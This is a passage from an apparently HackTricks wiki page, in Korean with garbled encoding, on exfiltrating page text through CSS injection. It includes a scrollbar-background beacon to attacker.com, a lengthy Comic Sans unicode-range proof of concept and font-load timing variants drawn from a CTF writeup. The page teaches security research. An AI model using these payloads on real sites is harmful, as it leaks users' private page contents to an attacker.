- ì´ëŸ¬í•œ í°íŠ¸ëŠ” fontforgeë¥¼ ì‚¬ìš©í•˜ì—¬ woff í˜•ì‹ìœ¼ë¡œ ë³€í™˜ë©ë‹ˆë‹¤.

2. **ë„ˆë¹„ ë³€í™” ê°ì§€**:
- CSSëŠ” í…ìŠ¤íŠ¸ê°€ ì¤„ ë°”ê¿ˆë˜ì§€ ì•Šë„ë¡ ë³´ì¥í•˜ê³  (`white-space: nowrap`) ìŠ¤í¬ë¡¤ë°” ìŠ¤íƒ€ì¼ì„ ì‚¬ìš©ì ì •ì˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
- íŠ¹ì • ë¦¬ê°€ì²˜, ì¦‰ íŠ¹ì • ë¬¸ì ì‹œí€€ìŠ¤ê°€ í…ìŠ¤íŠ¸ì— ì¡´ì¬í•¨ì„ ë‚˜íƒ€ë‚´ëŠ” ìˆ˜í‰ ìŠ¤í¬ë¡¤ë°”ì˜ ì¶œí˜„ì€ ì§€í‘œ(ì˜¤ë¼í´) ì—­í• ì„ í•©ë‹ˆë‹¤.
- ê´€ë ¨ CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **ìµìŠ¤í”Œë¡œì‡ ê³¼ì •**:
- **1ë‹¨ê³„**: ìƒë‹¹í•œ ë„ˆë¹„ë¥¼ ê°€ì§„ ë¬¸ì ìŒì— ëŒ€í•œ í°íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- **2ë‹¨ê³„**: í° ë„ˆë¹„ ê¸€ë¦¬í”„(ë¬¸ì ìŒì— ëŒ€í•œ ë¦¬ê°€ì²˜)ê°€ ë Œë”ë§ë  ë•Œë¥¼ ê°ì§€í•˜ê¸° ìœ„í•´ ìŠ¤í¬ë¡¤ë°” ê¸°ë°˜ì˜ íŠ¸ë¦­ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
- **3ë‹¨ê³„**: ë¦¬ê°€ì²˜ë¥¼ ê°ì§€í•˜ë©´, ê°ì§€ëœ ìŒì„ í¬í•¨í•˜ê³  ì•ì´ë‚˜ ë’¤ì— ë¬¸ìë¥¼ ì¶”ê°€í•˜ì—¬ ì„¸ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ìƒˆë¡œìš´ ê¸€ë¦¬í”„ê°€ ìƒì„±ë©ë‹ˆë‹¤.
- **4ë‹¨ê³„**: ì„¸ ë¬¸ì ë¦¬ê°€ì²˜ì˜ ê°ì§€ê°€ ìˆ˜í–‰ë©ë‹ˆë‹¤.
- **5ë‹¨ê³„**: ì´ ê³¼ì •ì€ ë°˜ë³µë˜ì–´ ì „ì²´ í…ìŠ¤íŠ¸ë¥¼ ì ì§„ì ìœ¼ë¡œ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

4. **ìµœì í™”**:
- í˜„ì¬ `<meta refresh=...`ë¥¼ ì‚¬ìš©í•˜ëŠ” ì´ˆê¸°í™” ë°©ë²•ì€ ìµœì ì´ ì•„ë‹™ë‹ˆë‹¤.
- CSS `@import` íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ëŠ” ë” íš¨ìœ¨ì ì¸ ì ‘ê·¼ ë°©ì‹ì´ ìµìŠ¤í”Œë¡œì‡ì˜ ì„±ëŠ¥ì„ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

ì´ íŠ¸ë¦­ì€ ì´ [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/)ì—ì„œ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. í…ìŠ¤íŠ¸ ë…¸ë“œì—ì„œ ì‚¬ìš©ë˜ëŠ” ë¬¸ì ì§‘í•©ì€ **ë¸Œë¼ìš°ì €ì— ì„¤ì¹˜ëœ ê¸°ë³¸ í°íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬** ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤: ì™¸ë¶€ ë˜ëŠ” ì‚¬ìš©ì ì •ì˜ í°íŠ¸ê°€ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ì´ ê°œë…ì€ ì• ë‹ˆë©”ì´ì…˜ì„ í™œìš©í•˜ì—¬ `div`ì˜ ë„ˆë¹„ë¥¼ ì ì§„ì ìœ¼ë¡œ í™•ì¥í•˜ì—¬ í•œ ë²ˆì— í•˜ë‚˜ì˜ ë¬¸ìê°€ í…ìŠ¤íŠ¸ì˜ 'ì ‘ë¯¸ì‚¬' ë¶€ë¶„ì—ì„œ 'ì ‘ë‘ì‚¬' ë¶€ë¶„ìœ¼ë¡œ ì „í™˜ë˜ë„ë¡ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ê³¼ì •ì€ í…ìŠ¤íŠ¸ë¥¼ ë‘ ì„¹ì…˜ìœ¼ë¡œ íš¨ê³¼ì ìœ¼ë¡œ ë‚˜ëˆ•ë‹ˆë‹¤:

1. **ì ‘ë‘ì‚¬**: ì´ˆê¸° ì¤„.
2. **ì ‘ë¯¸ì‚¬**: ì´í›„ ì¤„.

ë¬¸ìì˜ ì „í™˜ ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë‚˜íƒ€ë‚©ë‹ˆë‹¤:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


ì´ ì „í™˜ ë™ì•ˆ, **unicode-range íŠ¸ë¦­**ì´ ì‚¬ìš©ë˜ì–´ ì ‘ë‘ì‚¬ì— ìƒˆ ë¬¸ìê°€ ì¶”ê°€ë  ë•Œë§ˆë‹¤ ì´ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ëŠ” Comic Sansë¡œ ê¸€ê¼´ì„ ì „í™˜í•˜ì—¬ ì´ë£¨ì–´ì§€ë©°, ì´ëŠ” ê¸°ë³¸ ê¸€ê¼´ë³´ë‹¤ ëˆˆì— ë„ê²Œ ë” ë†’ì•„ ìˆ˜ì§ ìŠ¤í¬ë¡¤ë°”ë¥¼ ìœ ë°œí•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¡¤ë°”ì˜ ì¶œí˜„ì€ ì ‘ë‘ì‚¬ì— ìƒˆ ë¬¸ìê°€ ì¡´ì¬í•¨ì„ ê°„ì ‘ì ìœ¼ë¡œ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

ì´ ë°©ë²•ì€ ê³ ìœ í•œ ë¬¸ìê°€ ë‚˜íƒ€ë‚  ë•Œ ê°ì§€í•  ìˆ˜ ìˆì§€ë§Œ, ì–´ë–¤ ë¬¸ìê°€ ë°˜ë³µë˜ì—ˆëŠ”ì§€ëŠ” ëª…ì‹œí•˜ì§€ ì•Šê³  ë‹¨ì§€ ë°˜ë³µì´ ë°œìƒí–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

{% hint style="info" %}
ê¸°ë³¸ì ìœ¼ë¡œ, **unicode-rangeëŠ” ë¬¸ìë¥¼ ê°ì§€í•˜ëŠ” ë° ì‚¬ìš©ë˜ì§€ë§Œ**, ì™¸ë¶€ í°íŠ¸ë¥¼ ë¡œë“œí•˜ê³  ì‹¶ì§€ ì•Šê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.\
**ë¬¸ì**ê°€ **ë°œê²¬ë˜ë©´**, ë¯¸ë¦¬ ì„¤ì¹˜ëœ **Comic Sans í°íŠ¸**ê°€ **ì£¼ì–´ì ¸** ë¬¸ìê°€ **ë” ì»¤ì§€ê²Œ** í•˜ê³  **ìŠ¤í¬ë¡¤ ë°”ë¥¼ ìœ ë°œ**í•˜ì—¬ **ë°œê²¬ëœ ë¬¸ìë¥¼ ìœ ì¶œ**í•©ë‹ˆë‹¤.
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°ëŠ” ì´ì „ ê²½ìš°ì™€ ë§¤ìš° ìœ ì‚¬í•˜ì§€ë§Œ, ì´ ê²½ìš° íŠ¹ì • **ë¬¸ìë¥¼ ë‹¤ë¥¸ ë¬¸ìë³´ë‹¤ í¬ê²Œ ë§Œë“¤ì–´ì„œ** ë´‡ì´ ëˆ„ë¥´ì§€ ì•Šë„ë¡ ë²„íŠ¼ì´ë‚˜ ë¡œë“œë˜ì§€ ì•Šì„ ì´ë¯¸ì§€ë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒì´ ëª©í‘œì…ë‹ˆë‹¤. ë”°ë¼ì„œ ìš°ë¦¬ëŠ” í–‰ë™(ë˜ëŠ” í–‰ë™ì˜ ë¶€ì¬)ì„ ì¸¡ì •í•˜ê³  íŠ¹ì • ë¬¸ìê°€ í…ìŠ¤íŠ¸ ì•ˆì— ì¡´ì¬í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°, ìš°ë¦¬ëŠ” ë™ì¼í•œ ì¶œì²˜ì—ì„œ ê°€ì§œ ê¸€ê¼´ì„ ë¡œë“œí•˜ì—¬ í…ìŠ¤íŠ¸ì— ë¬¸ìê°€ ìˆëŠ”ì§€ ìœ ì¶œí•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
ë§Œì•½ ì¼ì¹˜í•˜ëŠ” ê²½ìš°, **í°íŠ¸ëŠ” `/static/bootstrap.min.css?q=1`ì—ì„œ ë¡œë“œë©ë‹ˆë‹¤**. ë¹„ë¡ ì„±ê³µì ìœ¼ë¡œ ë¡œë“œë˜ì§€ëŠ” ì•Šê² ì§€ë§Œ, **ë¸Œë¼ìš°ì €ëŠ” ì´ë¥¼ ìºì‹œí•´ì•¼ í•˜ë©°**, ìºì‹œê°€ ì—†ë”ë¼ë„ **304 not modified** ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìœ¼ë¯€ë¡œ, **ì‘ë‹µì€ ë‹¤ë¥¸ ê²ƒë“¤ë³´ë‹¤ ë” ë¹ ë¥¼ ê²ƒì…ë‹ˆë‹¤**.

í•˜ì§€ë§Œ ìºì‹œëœ ì‘ë‹µê³¼ ë¹„ìºì‹œëœ ì‘ë‹µì˜ ì‹œê°„ ì°¨ì´ê°€ ì¶©ë¶„íˆ í¬ì§€ ì•Šë‹¤ë©´, ì´ëŠ” ìœ ìš©í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì €ìëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì–¸ê¸‰í–ˆìŠµë‹ˆë‹¤: ê·¸ëŸ¬ë‚˜ í…ŒìŠ¤íŠ¸ í›„, ì²« ë²ˆì§¸ ë¬¸ì œëŠ” ì†ë„ê°€ ê·¸ë¦¬ ë‹¤ë¥´ì§€ ì•Šë‹¤ëŠ” ê²ƒì´ê³ , ë‘ ë²ˆì§¸ ë¬¸ì œëŠ” ë´‡ì´ `disk-cache-size=1` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ì •ë§ ì‚¬ë ¤ ê¹ŠìŠµë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (III): ìˆ˜ë°± ê°œì˜ ë¡œì»¬ "í°íŠ¸" ë¡œë”© ì‹œê°„ìœ¼ë¡œ charset ìœ ì¶œ (ì™¸ë¶€ ìì‚° í•„ìš” ì—†ìŒ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**ì°¸ê³ :** ì´ëŠ” [ì´ ê¸€ì—ì„œ ì‹¤íŒ¨í•œ í•´ê²°ì±…ìœ¼ë¡œ ì–¸ê¸‰ë©ë‹ˆë‹¤](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°, ì¼ì¹˜í•˜ëŠ” ê²½ìš° **CSSë¥¼ ì‚¬ìš©í•˜ì—¬ ë™ì¼í•œ ì¶œì²˜ì—ì„œ ìˆ˜ë°± ê°œì˜ ê°€ì§œ í°íŠ¸ë¥¼ ë¡œë“œí•˜ë„ë¡ ì§€ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ë ‡ê²Œ í•˜ë©´ **ì‹œê°„ì„ ì¸¡ì •**í•˜ê³  ë¬¸ì ë°œìƒ ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
ê·¸ë¦¬ê³  ë´‡ì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
ê·¸ë˜ì„œ, ê¸€ê¼´ì´ ì¼ì¹˜í•˜ì§€ ì•Šìœ¼ë©´ ë´‡ì„ ë°©ë¬¸í•  ë•Œ ì‘ë‹µ ì‹œê°„ì€ ì•½ 30ì´ˆê°€ ë  ê²ƒìœ¼ë¡œ ì˜ˆìƒë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸€ê¼´ì´ ì¼ì¹˜í•˜ë©´ ê¸€ê¼´ì„ ê°€ì ¸ì˜¤ê¸° ìœ„í•´ ì—¬ëŸ¬ ìš”ì²­ì´ ì „ì†¡ë˜ì–´ ë„¤íŠ¸ì›Œí¬ì— ì§€ì†ì ì¸ í™œë™ì´ ë°œìƒí•©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ì¤‘ì§€ ì¡°ê±´ì„ ë§Œì¡±í•˜ê³  ì‘ë‹µì„ ë°›ëŠ” ë° ë” ì˜¤ëœ ì‹œê°„ì´ ê±¸ë¦½ë‹ˆë‹¤. ë”°ë¼ì„œ ì‘ë‹µ ì‹œê°„ì€ ê¸€ê¼´ ì¼ì¹˜ ì—¬ë¶€ë¥¼ íŒë‹¨í•˜ëŠ” ì§€í‘œë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
